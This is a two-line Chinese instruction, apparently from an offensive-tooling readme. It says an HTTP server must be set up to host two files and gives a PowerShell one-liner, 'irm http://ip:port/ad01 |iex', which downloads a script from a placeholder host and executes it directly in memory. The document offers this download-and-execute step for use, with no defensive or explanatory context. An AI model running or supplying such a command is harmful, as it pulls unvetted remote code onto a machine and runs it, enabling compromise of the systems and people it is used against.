需要搭建一个http环境，能直接放到这两个文件
使用powershell命令行：  irm http://ip:port/ad01 |iex